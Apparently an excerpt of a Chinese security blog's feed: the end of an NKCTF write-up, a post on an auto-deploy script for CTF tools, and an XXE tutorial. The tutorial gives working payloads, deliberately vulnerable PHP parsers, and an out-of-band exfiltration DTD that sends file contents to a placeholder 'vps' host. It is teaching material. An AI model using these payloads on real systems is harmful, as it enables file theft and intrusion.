class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">b&quot;)&amp;n_qFb&#x27;NZXpj)*bLDmLnVj]@^_H&quot;</span><br>e=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    d=(i-<span class="hljs-number">0x28</span>+<span class="hljs-number">45</span>)^<span class="hljs-number">0x30</span><br>    <span class="hljs-keyword">if</span> d&lt;<span class="hljs-number">0x20</span>:<br>        d=d+<span class="hljs-number">48</span><br>    e.append(d)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(e))<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;rank：15&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/NKCTF2023.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot; class</summary>
      
    
    
    
    <category term="wp" scheme="https://www.lewiserii.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.lewiserii.top/tags/wp/"/>
    
    <category term="nkctf" scheme="https://www.lewiserii.top/tags/nkctf/"/>
    
  </entry>
  
  <entry>
    <title>auto_deploy.sh</title>
    <link href="https://www.lewiserii.top/%E5%85%B6%E4%BB%96/auto_deploy.html"/>
    <id>https://www.lewiserii.top/%E5%85%B6%E4%BB%96/auto_deploy.html</id>
    <published>2023-02-24T16:30:00.000Z</published>
    <updated>2023-08-31T14:11:33.708Z</updated>
    
    <content type="html"><![CDATA[<h1 id="auto-deploy"><a href="#auto-deploy" class="headerlink" title="auto_deploy"></a>auto_deploy</h1><p>一个自动部署Misc工具的<del>轻量</del>sh脚本<br>闲的无聊随便写的小玩意（部分代码由chatgpt完成）<br>适合在新环境中快速搭建misc环境</p><p><a href="https://github.com/lewiserii/auto_deploy">项目地址</a></p><h1 id="目前支持的功能"><a href="#目前支持的功能" class="headerlink" title="目前支持的功能"></a>目前支持的功能</h1><p>1：换源，允许root登录（ubuntu），开启ssh等基础操作<br>2：安装docker<br>3：安装docker-compose<br>4：安装golang<br>5：安装java<br>6：安装linux下的部分misc工具，具体如下</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs text">binwalk<br>bkcrack<br>blindwatermark<br>cloacked-pixel<br>dtmf2num<br>dwarf2json<br>exif<br>extundelete<br>f5-steganography<br>foremost<br>gaps<br>gnuplot<br>minimodem<br>montage<br>outguess<br>sstv<br>steghide<br>stegpy<br>stegseek<br>usb-mouse-pcap-visualizer<br>usbkeyboarddatahacker<br>volatility2<br>volatility3<br>webp<br>wireshark<br>zsteg<br></code></pre></td></tr></table></figure><h1 id="支持的系统"><a href="#支持的系统" class="headerlink" title="支持的系统"></a>支持的系统</h1><p>1：ubuntu16.04&#x2F;18.04&#x2F;20.04&#x2F;22.04<br>2：<del>centos7&#x2F;8</del>(只有部分功能适配了centos)</p><p>推荐ubuntu20</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>本脚本可重复运行安装<br>工具保存在运行脚本的<code>misc_tools</code>目录下</p><p>方法一：<br>git clone <a href="https://github.com/lewiserii/auto_deploy">https://github.com/lewiserii/auto_deploy</a><br>chmod 777 auto_deploy.sh<br>.&#x2F;auto_deploy.sh [mode]</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">usage: ./auto_deploy.sh [mode]<br>        basics              基础配置(换源，root，ssh)<br>        docker              安装docker<br>        docker-compoer      安装docker-compose<br>        go                  安装golang<br>        java                安装java<br>        misc-tools          安装misc工具<br></code></pre></td></tr></table></figure><p>方法二：<br>bash &lt;(curl -s <a href="https://raw.githubusercontent.com/lewiserii/auto_deploy/main/auto_deploy.sh">https://raw.githubusercontent.com/lewiserii/auto_deploy/main/auto_deploy.sh</a>) [mode]</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/auto_deploy/auto_deploy.gif"></p><h1 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h1><p>V1.0: 第一代脚本<br>V1.1: 增加python安装模块<br>V1.2: 优化安装逻辑等<br>V1.3：移除python，新增golang和java<br>V2.1：增加CTF-Misc部分工具的安装<br>V2.2：优化可重复运行脚本逻辑</p><h1 id="后续计划"><a href="#后续计划" class="headerlink" title="后续计划"></a>后续计划</h1><p>1：计划增加web系列工具</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;auto-deploy&quot;&gt;&lt;a href=&quot;#auto-deploy&quot; class=&quot;headerlink&quot; title=&quot;auto_deploy&quot;&gt;&lt;/a&gt;auto_deploy&lt;/h1&gt;&lt;p&gt;一个自动部署Misc工具的&lt;del&gt;轻量&lt;/del&gt;sh脚本&lt;br&gt;</summary>
      
    
    
    
    <category term="脚本" scheme="https://www.lewiserii.top/categories/%E8%84%9A%E6%9C%AC/"/>
    
    
    <category term="misc" scheme="https://www.lewiserii.top/tags/misc/"/>
    
    <category term="sh" scheme="https://www.lewiserii.top/tags/sh/"/>
    
    <category term="脚本" scheme="https://www.lewiserii.top/tags/%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>xxe学习总结</title>
    <link href="https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/xxe%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.html"/>
    <id>https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/xxe%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.html</id>
    <published>2023-02-15T04:00:00.000Z</published>
    <updated>2023-06-24T05:07:21.683Z</updated>
    
    <content type="html"><![CDATA[<h1 id="从XML到XXE"><a href="#从XML到XXE" class="headerlink" title="从XML到XXE"></a>从XML到XXE</h1><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p><strong>什么是 XML？</strong><br>XML 指可扩展标记语言（EXtensible Markup Language）。<br>XML 的设计宗旨是传输数据，而不是显示数据。<br>XML 是 W3C 的推荐标准。<br>XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。<br>XML 语言没有预定义的标签。</p><p><strong>XML 和 HTML 之间的差异</strong><br>XML 不是 HTML 的替代。<br>XML 和 HTML 为不同的目的而设计：</p><blockquote><p>XML 被设计用来传输和存储数据，其焦点是数据的内容。<br>HTML 被设计用来显示数据，其焦点是数据的外观。<br>HTML 旨在显示信息，而 XML 旨在传输信息。</p></blockquote><p>XML文档结构包括<code>XML声明</code>、<code>DTD文档类型定义（可选）</code>、<code>文档元素</code>。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--XML申明--&gt;</span><br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><br><span class="hljs-comment">&lt;!--文档类型定义--&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [  &lt;!--定义此文档是 note 类型的文档--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">note</span> (<span class="hljs-keyword">to</span>,<span class="hljs-keyword">from</span>,<span class="hljs-keyword">heading</span>,<span class="hljs-keyword">body</span>)&gt;</span>  &lt;!--定义note元素有四个元素--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">to</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span>     &lt;!--定义to元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">from</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义from元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">head</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义head元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">body</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义body元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-comment">&lt;!--文档元素--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Dave<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>Tom<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>Reminder<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>You are a good man<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><p>DTD(文档类型定义，Document Type Definition )的作用是定义<code>XML</code>文档的合法构建模块。它使用一系列的合法元素来定义文档结构。</p><h3 id="DTD引用方式"><a href="#DTD引用方式" class="headerlink" title="DTD引用方式"></a>DTD引用方式</h3><p>1）DTD 内部声明<br><code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p><p>2）DTD 外部引用<br><code>&lt;!DOCTYPE 根元素名称 SYSTEM &quot;外部DTD的URI&quot;&gt;</code></p><p>3）引用公共DTD<br><code>&lt;!DOCTYPE 根元素名称 PUBLIC &quot;DTD标识名&quot; &quot;公用DTD的URI&quot;&gt;</code></p><h3 id="DTD-关键字"><a href="#DTD-关键字" class="headerlink" title="DTD 关键字"></a>DTD 关键字</h3><ul><li>DOCTYPE（DTD的声明）</li><li>ENTITY（实体的声明）</li><li>SYSTEM、PUBLIC（外部资源申请）</li><li>ELEMENT（定义元素声明）</li></ul><h2 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h2><p>实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。<br>实体按类型主要分为以下四种：</p><ul><li>内置实体 (Built-in entities)</li><li>字符实体 (Character entities)</li><li>通用实体&#x2F;普通实体 (General entities)</li><li>参数实体 (Parameter entities)</li></ul><p><strong>内置实体</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">&amp;符号: &amp;amp;<br>单引号: &amp;apos;<br>＞: &amp;gt;<br>＜: &amp;lt;<br>双引号: &amp;quot;<br></code></pre></td></tr></table></figure><p><strong>字符实体</strong></p><p>通常是<code>html</code>的实体编码，例如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version = <span class="hljs-string">&quot;1.0&quot;</span> encoding = <span class="hljs-string">&quot;UTF-8&quot;</span> standalone = <span class="hljs-string">&quot;yes&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">author</span>[</span><br><span class="hljs-meta">   <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">author</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta">   <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">copyright</span> <span class="hljs-string">&quot;&amp;#169;&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span><span class="hljs-symbol">&amp;writer;</span><span class="hljs-symbol">&amp;copyright;</span><span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>&amp;#169</code>即<code>©</code></p><p><strong>普通实体</strong></p><p>例如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version = <span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [</span><br><span class="hljs-meta">   <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">source-text</span> <span class="hljs-string">&quot;tutorialspoint&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br>   &amp;source-text;<br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>参数实体</strong></p><p>例如</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">ename</span> <span class="hljs-string">&quot;entity_value&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>参数实体必须先定义再使用，而不能像一般实体那样随意放置。</p><h3 id="内部实体与外部实体"><a href="#内部实体与外部实体" class="headerlink" title="内部实体与外部实体"></a>内部实体与外部实体</h3><p>实体根据引用方式，还可分为内部实体与外部实体。</p><p>内部实体：<br><code>&lt;!ENTITY entity_name &quot;entity_value&quot;&gt;</code></p><p>外部实体：<br><code>&lt;!ENTITY name SYSTEM &quot;URI/URL&quot;&gt;</code></p><h3 id="通用实体和参数实体"><a href="#通用实体和参数实体" class="headerlink" title="通用实体和参数实体"></a>通用实体和参数实体</h3><p>其实按照使用来分类，又可以将实体分为通用实体和参数实体。</p><p>通用实体：<br>用<code>&amp;实体名;</code>引用的实体，他在<code>DTD</code>中定义，在<code>XML</code>文档中引用</p><p>参数实体：<br>使用<code>% 实体名</code>在<code>DTD</code>中定义，并且只能在<code>DTD</code>中使用<code>%实体名;</code>引用<br>只有在<code>DTD</code>文件中，参数实体的声明才能引用其他实体<br>和通用实体一样，参数实体也可以外部引用</p><h3 id="不同程序支持的协议"><a href="#不同程序支持的协议" class="headerlink" title="不同程序支持的协议"></a>不同程序支持的协议</h3><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-4.png"></p><blockquote><p>1.其中从2012年9月开始，Oracle JDK版本中删除了对gopher方案的支持，后来又支持的版本是 Oracle JDK 1.7 update 7 和 Oracle JDK 1.6 update 35<br>2.libxml 是 PHP 的 xml 支持</p></blockquote><p>PHP支持的协议会更多一些，但需要一定的扩展：</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-9.png"></p><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>XXE漏洞全称<code>XML External Entity Injection</code>即XML外部实体注入。<br>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。</p><h1 id="XXE的几种利用方式"><a href="#XXE的几种利用方式" class="headerlink" title="XXE的几种利用方式"></a>XXE的几种利用方式</h1><h2 id="有回显任意文件读取-Normal-Based-XXE"><a href="#有回显任意文件读取-Normal-Based-XXE" class="headerlink" title="有回显任意文件读取(Normal Based XXE)"></a>有回显任意文件读取(Normal Based XXE)</h2><p>服务能接收并解析 XML 格式的输入并且有回显的时候，我们就能输入我们自定义的 XML 代码，通过引用外部实体的方法，引用服务器上面的文件</p><p>xxe.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>); <span class="hljs-comment">//获取客户端输入内容</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();    <span class="hljs-comment">//初始化XML解析器</span><br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD); <span class="hljs-comment">//加载客户端输入的XML内容</span><br>    <span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);  <span class="hljs-comment">//获取XML文档节点，如果成功则返回SimpleXMLElement对象，如果失败则返回FALSE</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$creds</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span> ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-1.png"></p><h3 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h3><p>如果读取的文件中包含特殊符号，比如<code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>、<code>&quot;</code>、<code>&#39;</code>等，就会返回一些报错信息</p><p>这时可以使用<code>CDATA</code>或者<code>base64 convert</code></p><p>术语<code>CDATA</code>指的是不应由<code>XML解析器</code>进行解析的文本数据<code>（Unparsed Character Data）</code><br><code>CDATA</code>部分由<code>&quot;&lt;![CDATA[&quot;</code>开始，由<code>&quot;]]&gt;&quot;</code>结束，解析器会忽略<code>CDATA</code>部分中的所有内容</p><p>我们的思路就是把读取的文件放在CDATA中之后再调用</p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span></span><br><span class="hljs-meta">[<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">start</span></span></span><br><span class="hljs-meta"><span class="hljs-meta"><span class="hljs-string">&quot;&lt;![CDATA[&lt;!ENTITY % xxe SYSTEM &quot;</span>file:///flag<span class="hljs-string">&quot;&gt; ]]&gt;&quot;</span></span></span><br><span class="hljs-meta"><span class="hljs-meta">&gt;</span>]</span><br><span class="hljs-meta">% <span class="hljs-keyword">xxe</span>;&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span>&amp;start<span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br></code></pre></td></tr></table></figure><p>不过使用这个payload读文件时还是会报错，因为在<code>xml</code>中，<code>xml</code>解析器有个限制：不能在内部<code>Entity</code>中引用，<code>“PEReferences forbidden in internal subset in Entity ”</code>指的就是禁止内部参数实体引用</p><p>所以需要调用的外部的<code>dtd</code></p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">start</span> <span class="hljs-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">go</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">end</span> <span class="hljs-string">&quot;]]&gt;&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://vps/evil.dtd&quot;</span>&gt;</span>%dtd;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;all;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">all</span> <span class="hljs-string">&quot;%start;%go;%end;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-2.png"></p><h2 id="无回显任意文件读取-Blind-Based-XXE"><a href="#无回显任意文件读取-Blind-Based-XXE" class="headerlink" title="无回显任意文件读取(Blind Based XXE)"></a>无回显任意文件读取(Blind Based XXE)</h2><p>xxe.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="出网"><a href="#出网" class="headerlink" title="出网"></a>出网</h3><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">convert</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://vps/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">%remote;%int;%send;</span><br><span class="hljs-meta">]&gt;</span><br></code></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">int</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://vps:port?a=%file;&#x27;&gt;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>vps上监听对应的端口</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-3.png"></p><p>先调用了<code>%remote</code>，请求远程服务器上的<code>evil.dtd</code>，类似php的<code>include</code>，然后<code>%int</code>调用<code>%file</code>，<code>%file</code>获取敏感文件后将结果填入到<code>%send</code>，最后调用<code>%send</code>把我们的读取到的数据发送到我们的远程服务器上，这样就实现了外带数据的效果，要注意实体的值中不能有<code>%</code>, 所以将其转成html实体编码</p><h3 id="不出网"><a href="#不出网" class="headerlink" title="不出网"></a>不出网</h3><p>以上都是引入外部服务器的<code>OOB XXE（Out-of-band）</code>，虽然好用，但是有一个软肋。当服务器配置好防火墙，禁止服务器请求外网dtd文件的话，就无法接受到数据了。</p><p>这时候就可以考虑利用本地dtd来进行XXE</p><p>linux</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">local_dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">ISOamsa</span> <span class="hljs-string">&#x27;Your DTD code&#x27;</span>&gt;</span><br>%local_dtd;<br></code></pre></td></tr></table></figure><p>windows</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">local_dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file://C:/Windows/System32/wbem/xml/cim20.dtd&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">SuperClass</span> <span class="hljs-string">&#x27;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&#x27;</span>&gt;</span><br>%local_dtd;<br></code></pre></td></tr></table></figure><p>引用内部实体payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 